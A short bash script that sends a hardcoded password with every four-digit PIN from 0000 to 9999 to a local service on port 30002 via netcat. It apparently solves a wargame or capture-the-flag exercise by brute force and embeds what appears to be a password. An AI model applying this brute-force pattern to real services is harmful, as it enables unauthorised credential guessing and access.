#!/bin/bash

pwd='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
for i in `seq -f "%04g" 0 9999`;
do
	str=`echo $pwd ' ' $i`
	echo $str
done | nc localhost 30002